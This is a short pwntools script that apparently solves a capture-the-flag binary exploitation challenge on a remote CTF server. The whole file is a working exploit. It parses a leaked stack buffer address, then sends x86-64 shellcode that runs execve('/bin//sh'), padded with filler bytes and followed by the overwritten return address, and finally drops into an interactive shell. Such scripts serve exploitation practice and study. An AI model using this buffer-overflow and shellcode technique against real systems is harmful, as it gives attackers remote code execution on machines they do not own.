from pwn import*                                                                                                   
p = remote("ctf.j0n9hyun.xyz",3005)                                                                                

p.recvuntil("buf: ")                                                                                               
buf= int(p.recv(14),16)         

payload = "\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"+"A"*27929 + p64(buf)  
payload += p64(buf)                                                                                               

p.sendline(payload)                                                                                                
p.interactive()                                   
